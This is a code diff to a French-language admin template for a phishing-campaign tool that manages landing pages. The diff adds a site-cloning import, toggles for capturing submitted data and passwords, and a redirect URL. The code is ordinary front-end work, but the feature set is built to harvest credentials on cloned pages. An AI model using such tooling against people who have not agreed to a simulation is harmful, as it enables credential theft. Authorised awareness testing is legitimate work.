@@ -13,8 +13,10 @@
 
 <h3>📄 Gestion des Pages de destination</h3>
 
-<!-- Bouton pour créer une nouvelle landing page -->
-<button class="btn btn-success mb-3" data-bs-toggle="modal" data-bs-target="#newLandingPageModal">➕ Nouvelle Page de destination</button>
+<!-- Bouton pour ouvrir le modal de création -->
+<div class="mb-3">
+    <button class="btn btn-success" data-bs-toggle="modal" data-bs-target="#newLandingPageModal">➕ Nouvelle Page de destination</button>
+</div>
 
 <!-- Table des landing pages -->
 <div class="table-responsive">
@@ -36,7 +38,7 @@
     </table>
 </div>
 
-<!-- ========== MODAL: CREATE NEW LANDING PAGE ========== -->
+<!-- ========== MODAL: CRÉER UNE NOUVELLE LANDING PAGE ========== -->
 <div class="modal fade" id="newLandingPageModal" tabindex="-1">
     <div class="modal-dialog">
         <div class="modal-content">
@@ -45,14 +47,51 @@
                 <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
             </div>
             <div class="modal-body">
+                <!-- Nom de la landing page -->
                 <label for="newLandingPageName" class="form-label">Nom :</label>
                 <input type="text" id="newLandingPageName" class="form-control mb-2" required>
-                <div class="d-flex justify-content-between align-items-center">
-                    <label for="newLandingPageHTML" class="form-label">HTML :</label>
+
+                <!-- Section Importer un site -->
+                <div class="border p-2 mb-3">
+                    <h6 class="mb-2">Importer un site</h6>
+                    <label for="importSiteURL" class="form-label">URL du site :</label>
+                    <input type="text" id="importSiteURL" class="form-control" placeholder="http://example.com">
+                    <div class="form-check mt-2">
+                        <input class="form-check-input" type="checkbox" id="includeResources">
+                        <label class="form-check-label" for="includeResources">
+                            Inclure les ressources (ajouter un tag &lt;base&gt;)
+                        </label>
+                    </div>
+                    <button class="btn btn-info btn-sm mt-2" type="button" onclick="importSite()">Importer</button>
+                </div>
+
+                <!-- Code HTML de la landing page -->
+                <label for="newLandingPageHTML" class="form-label">HTML :</label>
+                <div class="d-flex justify-content-between align-items-center mb-1">
                     <button class="btn btn-secondary btn-sm" onclick="togglePreview('newLandingPageHTML', 'previewNewPage')" type="button">Vue/Code</button>
                 </div>
                 <textarea id="newLandingPageHTML" class="form-control" rows="5" required></textarea>
                 <div id="previewNewPage" class="border p-3 mt-2" style="display: none;"></div>
+
+                <!-- Options supplémentaires -->
+                <label class="form-label mt-2">Capture des données :</label>
+                <div class="form-check">
+                    <input class="form-check-input" type="checkbox" id="newCaptureCredentials" checked>
+                    <label class="form-check-label" for="newCaptureCredentials">
+                        Activer la capture des données
+                    </label>
+                </div>
+
+                <label class="form-label mt-2">Capture des mots de passe :</label>
+                <div class="form-check">
+                    <input class="form-check-input" type="checkbox" id="newCapturePasswords">
+                    <label class="form-check-label" for="newCapturePasswords">
+                        Capturer également les mots de passe
+                    </label>
+                </div>
+
+                <label for="newRedirectUrl" class="form-label mt-2">URL de redirection :</label>
+                <input type="text" id="newRedirectUrl" class="form-control" placeholder="http://example.com">
             </div>
             <div class="modal-footer">
                 <button class="btn btn-success" onclick="submitNewLandingPage()">Enregistrer</button>
@@ -61,7 +100,7 @@
     </div>
 </div>
 
-<!-- ========== MODAL: EDIT LANDING PAGE ========== -->
+<!-- ========== MODAL: MODIFIER UNE LANDING PAGE ========== -->
 <div class="modal fade" id="editLandingPageModal" tabindex="-1">
     <div class="modal-dialog">
         <div class="modal-content">
@@ -74,12 +113,33 @@
                 
                 <label for="editLandingPageName" class="form-label">Nom :</label>
                 <input type="text" id="editLandingPageName" class="form-control mb-2" required>
-                <div class="d-flex justify-content-between align-items-center">
-                    <label for="editLandingPageHTML" class="form-label">HTML :</label>
+
+                <label for="editLandingPageHTML" class="form-label">HTML :</label>
+                <div class="d-flex justify-content-between align-items-center mb-1">
                     <button class="btn btn-secondary btn-sm" onclick="togglePreview('editLandingPageHTML', 'previewEditPage')" type="button">Vue/Code</button>
                 </div>
                 <textarea id="editLandingPageHTML" class="form-control" rows="5" required></textarea>
                 <div id="previewEditPage" class="border p-3 mt-2" style="display: none;"></div>
+                
+                <!-- Options supplémentaires -->
+                <label class="form-label mt-2">Capture des données :</label>
+                <div class="form-check">
+                    <input class="form-check-input" type="checkbox" id="editCaptureCredentials" checked>
+                    <label class="form-check-label" for="editCaptureCredentials">
+                        Activer la capture des données
+                    </label>
+                </div>
+
+                <label class="form-label mt-2">Capture des mots de passe :</label>
+                <div class="form-check">
+                    <input class="form-check-input" type="checkbox" id="editCapturePasswords">
+                    <label class="form-check-label" for="editCapturePasswords">
+                        Capturer également les mots de passe
+                    </label>
+                </div>
+
+                <label for="editRedirectUrl" class="form-label mt-2">URL de redirection :</label>
+                <input type="text" id="editRedirectUrl" class="form-control" placeholder="http://example.com">
             </div>
             <div class="modal-footer">
                 <button class="btn btn-primary" onclick="submitEditedLandingPage()">Enregistrer</button>
@@ -89,7 +149,6 @@
 </div>
 
 <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
-
 <script>
 document.addEventListener("DOMContentLoaded", function() {
     // Charger les landing pages existantes
@@ -102,7 +161,7 @@ document.addEventListener("DOMContentLoaded", function() {
                 tbody.innerHTML += `
                     <tr data-id="${page.id}">
                         <td>${page.name}</td>
-                        <td>
+                        <td class="text-end">
                             <button class="btn btn-primary btn-sm edit-landing-page" data-id="${page.id}" data-bs-toggle="modal" data-bs-target="#editLandingPageModal">✏️ Modifier</button>
                             <button class="btn btn-danger btn-sm delete-landing-page" data-id="${page.id}">🗑️ Supprimer</button>
                         </td>
@@ -117,7 +176,7 @@ function togglePreview(textareaId, previewId) {
     const preview = document.getElementById(previewId);
 
     if (preview.style.display === "none") {
-        preview.innerHTML = textarea.value; // Affiche l'HTML
+        preview.innerHTML = textarea.value;
         preview.style.display = "block";
         textarea.style.display = "none";
     } else {
@@ -125,7 +184,6 @@ function togglePreview(textareaId, previewId) {
         textarea.style.display = "block";
     }
 }
-
 
 function validateLandingPageForm(nameId, htmlId) {
     const name = document.getElementById(nameId).value.trim();
@@ -143,7 +201,6 @@ function validateLandingPageForm(nameId, htmlId) {
     return true;
 }
 
-
 // Création d'une nouvelle landing page
 function submitNewLandingPage() {
     if (!validateLandingPageForm("newLandingPageName", "newLandingPageHTML")) return;
@@ -151,9 +208,9 @@ function submitNewLandingPage() {
     const data = {
         name: document.getElementById("newLandingPageName").value,
         html: document.getElementById("newLandingPageHTML").value,
-        capture_credentials: true,
-        capture_passwords: false,
-        redirect_url: "http://example.com"
+        capture_credentials: document.getElementById("newCaptureCredentials").checked,
+        capture_passwords: document.getElementById("newCapturePasswords").checked,
+        redirect_url: document.getElementById("newRedirectUrl").value.trim() || null
     };
 
     fetch("/config-landing-pages", {
@@ -182,7 +239,6 @@ function submitNewLandingPage() {
         }
     })
     .catch(err => {
-        Swal.close();
         console.error("Erreur:", err);
         Swal.fire({
             icon: "error",
@@ -193,22 +249,27 @@ function submitNewLandingPage() {
     });
 }
 
-
 // Chargement des données pour modification
 document.querySelectorAll(".edit-landing-page").forEach(btn => {
     btn.addEventListener("click", function() {
         const pageId = this.getAttribute("data-id");
 
-        fetch(`/config-landing-pages/${pageId}`)  // 🔹 Correction ici
+        fetch(`/config-landing-pages/${pageId}`)
             .then(response => response.json())
             .then(data => {
                 document.getElementById("editLandingPageId").value = data.id;
                 document.getElementById("editLandingPageName").value = data.name;
                 document.getElementById("editLandingPageHTML").value = data.html;
+                // Remplir également les options si elles sont définies
+                document.getElementById("editCaptureCredentials").checked = data.capture_credentials;
+                document.getElementById("editCapturePasswords").checked = data.capture_passwords;
+                document.getElementById("editRedirectUrl").value = data.redirect_url || "";
             })
             .catch(err => console.error("Erreur lors du chargement de la page de destination :", err));
     });
 });
+
+
 
 // Modification d'une landing page
 function submitEditedLandingPage() {
@@ -219,9 +280,9 @@ function submitEditedLandingPage() {
         id: parseInt(pageId, 10),
         name: document.getElementById("editLandingPageName").value,
         html: document.getElementById("editLandingPageHTML").value,
-        capture_credentials: true,
-        capture_passwords: false,
-        redirect_url: "http://example.com"
+        capture_credentials: document.getElementById("editCaptureCredentials").checked,
+        capture_passwords: document.getElementById("editCapturePasswords").checked,
+        redirect_url: document.getElementById("editRedirectUrl").value.trim() || null
     };
 
     fetch(`/config-landing-pages/${pageId}`, {
@@ -250,7 +311,6 @@ function submitEditedLandingPage() {
         }
     })
     .catch(err => {
-        Swal.close();
         console.error("Erreur:", err);
         Swal.fire({
             icon: "error",
@@ -260,6 +320,7 @@ function submitEditedLandingPage() {
         });
     });
 }
+
 
 // Suppression d'une landing page
 document.querySelectorAll(".delete-landing-page").forEach(btn => {
@@ -278,7 +339,6 @@ document.querySelectorAll(".delete-landing-page").forEach(btn => {
         reverseButtons: true
       }).then((result) => {
         if (result.isConfirmed) {
-          // Si l'utilisateur confirme, envoi de la requête DELETE
           fetch(`/config-landing-pages/${pageId}`, { 
             method: "DELETE"
           })
@@ -305,7 +365,64 @@ document.querySelectorAll(".delete-landing-page").forEach(btn => {
         }
       });
     });
-  });
-</script>
+});
 
+// Fonction pour importer un site et pré-remplir le formulaire de création
+function importSite() {
+    const url = document.getElementById("importSiteURL").value.trim();
+    const includeResources = document.getElementById("includeResources").checked;
+
+    if (!url) {
+        Swal.fire({
+            icon: "warning",
+            title: "Champ requis manquant",
+            text: "Veuillez fournir l'URL du site.",
+            confirmButtonColor: "#f39c12"
+        });
+        return;
+    }
+
+    const data = {
+        url: url,
+        include_resources: includeResources
+    };
+
+    fetch("/import_site", {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json",
+        },
+        body: JSON.stringify(data)
+    })
+    .then(res => res.json())
+    .then(response => {
+        if (response.error) {
+            Swal.fire({
+                icon: "error",
+                title: "Erreur lors de l'import",
+                text: response.error,
+                confirmButtonColor: "#d33"
+            });
+        } else {
+            // Remplir le textarea HTML avec le code récupéré
+            document.getElementById("newLandingPageHTML").value = response.html;
+            Swal.fire({
+                icon: "success",
+                title: "Site importé avec succès !",
+                text: "Le code HTML a été récupéré. Vous pouvez le modifier si nécessaire.",
+                confirmButtonColor: "#28a745"
+            });
+        }
+    })
+    .catch(err => {
+        console.error("Erreur:", err);
+        Swal.fire({
+            icon: "error",
+            title: "Erreur serveur",
+            text: "Une erreur s'est produite lors de l'import du site.",
+            confirmButtonColor: "#d33"
+        });
+    });
+}
+</script>
 {% endblock %}
